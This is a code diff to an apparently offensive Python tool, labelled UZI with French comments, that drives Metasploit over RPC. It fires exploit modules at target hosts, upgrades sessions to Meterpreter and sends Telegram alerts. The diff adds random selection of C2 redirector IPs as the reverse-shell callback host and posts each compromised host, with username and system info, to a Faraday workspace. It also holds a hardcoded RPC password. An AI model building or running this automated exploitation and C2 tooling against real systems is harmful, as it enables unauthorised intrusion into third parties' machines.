@@ -29,6 +29,11 @@ PG_DBNAME = os.getenv("PG_DBNAME", "msf")
 
 MODE_RUN = int(os.getenv("MODE_RUN", "1"))
 
+FARADAY_URL      = os.getenv('FARADAY_URL', '').rstrip('/')
+FARADAY_USER     = os.getenv('FARADAY_USER', 'faraday')
+FARADAY_PASSWORD = os.getenv('FARADAY_PASSWORD', '')
+FARADAY_WS       = os.getenv('FARADAY_WORKSPACE', 'default')
+
 def _detect_local_ip() -> str:
     for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
         try:
@@ -50,7 +55,20 @@ def _detect_local_ip() -> str:
     except Exception:
         return ""
 
-LHOST = os.getenv("LHOST", "") or _detect_local_ip()
+def _pick_redirector() -> str:
+    """Pick a random redirector IP from C2_REDIRECTORS (comma-separated).
+    Falls back to LHOST env, then auto-detect."""
+    redirectors_env = os.getenv("C2_REDIRECTORS", "")
+    if redirectors_env:
+        candidates = [ip.strip() for ip in redirectors_env.split(",") if ip.strip()]
+        if candidates:
+            import random
+            chosen = random.choice(candidates)
+            print(f"[INFO] Redirecteur sélectionné: {chosen} (pool: {candidates})")
+            return chosen
+    return os.getenv("LHOST", "") or _detect_local_ip()
+
+LHOST = _pick_redirector()
 LPORT = int(os.getenv("LPORT", "4444"))          # port externe (payload) — ex: 24444
 LPORT_BIND = int(os.getenv("LPORT_BIND", str(LPORT)))  # port handler interne — ex: 4444
 BIND_PORT = int(os.getenv("BIND_PORT", "5556"))
@@ -400,6 +418,64 @@ def report_note(address, enriched_info):
         print(f"[DB] Erreur report_note: {e}")
 
 
+def faraday_get_or_create_host(ip: str):
+    """Crée le host dans Faraday si nécessaire, retourne son ID."""
+    if not FARADAY_URL or not FARADAY_PASSWORD:
+        return None
+    auth = (FARADAY_USER, FARADAY_PASSWORD)
+    base = f"{FARADAY_URL}/_api/v3/ws/{FARADAY_WS}"
+    try:
+        requests.post(f"{base}/hosts", auth=auth,
+                      json={"ip": ip, "description": "UZI exploit target"}, timeout=10)
+        r = requests.get(f"{base}/hosts", auth=auth, params={"search": ip}, timeout=10)
+        if r.status_code == 200:
+            rows = r.json().get("rows", [])
+            if rows:
+                return rows[0]["id"]
+    except Exception as e:
+        print(f"[FARADAY] host lookup failed for {ip}: {e}")
+    return None
+
+
+def faraday_report_pwn(address: str, exploit_name: str, payload_name: str,
+                       session_info: dict = None):
+    """Enregistre un exploit confirmé dans Faraday comme vuln critique."""
+    if not FARADAY_URL or not FARADAY_PASSWORD:
+        return
+    ip = str(address).split('/')[0]
+    host_id = faraday_get_or_create_host(ip)
+    if not host_id:
+        return
+    auth = (FARADAY_USER, FARADAY_PASSWORD)
+    desc_parts = [f"Exploit: {exploit_name}", f"Payload: {payload_name}"]
+    if session_info:
+        for k in ('platform', 'arch', 'username', 'tunnel_peer', '_sysinfo', '_getuid'):
+            v = (session_info.get(k) or '').strip()
+            if v:
+                desc_parts.append(f"{k}: {v}")
+    vuln = {
+        'name': exploit_name,
+        'desc': '\n'.join(desc_parts),
+        'severity': 'critical',
+        'refs': [{'name': 'Metasploit', 'type': 'other'}],
+        'data': f"payload: {payload_name}",
+        'type': 'Vulnerability',
+        'parent': host_id,
+        'parent_type': 'Host',
+    }
+    try:
+        r = requests.post(
+            f"{FARADAY_URL}/_api/v3/ws/{FARADAY_WS}/vulns",
+            auth=auth, json=vuln, timeout=10
+        )
+        if r.status_code in (200, 201, 409):
+            print(f"[FARADAY] {ip} — {exploit_name} → vuln critique postée")
+        else:
+            print(f"[FARADAY] POST {r.status_code}: {r.text[:100]}")
+    except Exception as e:
+        print(f"[FARADAY] POST failed: {e}")
+
+
 def filter_exploits_by_profile(exploits, allowed_patterns, os_name=''):
     """Filtre les exploits par profil service ET par OS de la cible."""
     if not allowed_patterns:
@@ -732,6 +808,8 @@ def upgrade_to_meterpreter(client, sid, host, bind_port=None):
             except Exception as e:
                 print(f"[UPGRADE] Enrichissement session échoué: {e}")
             report_note(host, enriched)
+            faraday_report_pwn(str(host), enriched.get('via_exploit', '?'),
+                               enriched.get('via_payload', '?'), enriched)
             send_telegram_alert({msid: enriched}, host)
             return msid
 
@@ -769,7 +847,8 @@ def main():
         return
 
 
-    client = MsfRpcClient('totototo', port=55553, server="127.0.0.1", ssl=True)
+    _msf_host = os.getenv("MSF_HOST", "127.0.0.1")
+    client = MsfRpcClient('totototo', port=55553, server=_msf_host, ssl=True)
 
     # Démarrer le listener multi/handler en tâche de fond
     if LHOST:
@@ -1021,6 +1100,7 @@ def main():
                          stats['pwned'].append((mod['fullname'], p))
                          print(f"[PWN] {mod['fullname']} → sessions {sorted(new_sessions)}")
                          report_vuln(str(host), mod['fullname'], p, sorted(new_sessions)[0])
+                         faraday_report_pwn(str(host), mod['fullname'], p)
                          break  # session ouverte — inutile d'essayer d'autres payloads
          check_con.destroy()
 
